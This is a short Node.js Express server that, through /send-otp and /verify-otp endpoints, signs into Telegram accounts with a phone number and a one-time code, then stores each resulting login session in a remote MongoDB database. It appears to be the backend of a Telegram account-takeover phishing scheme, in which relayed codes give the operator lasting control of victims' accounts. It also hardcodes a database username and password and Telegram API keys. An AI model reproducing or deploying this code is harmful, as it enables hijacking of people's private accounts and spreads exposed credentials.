const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const MONGODB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
mongoose.connect(MONGODB_URI);

const SessionSchema = new mongoose.Schema({ phone: String, session: String });
const SessionModel = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = "e9c00af578a9de0253ef02337460498f";
let client = null;
let phoneCodeHash = null;

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();
    const result = await client.sendCode({ apiId, apiHash }, phone);
    phoneCodeHash = result.phoneCodeHash;
    res.json({ status: 'sent' });
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code } = req.body;
    try {
        await client.signIn({
            apiId,
            apiHash,
            phone,
            phoneCodeHash,
            phoneCode: code,
        });
        const sessionString = client.session.save();
        await SessionModel.create({ phone, session: sessionString });
        res.json({ status: 'success' });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
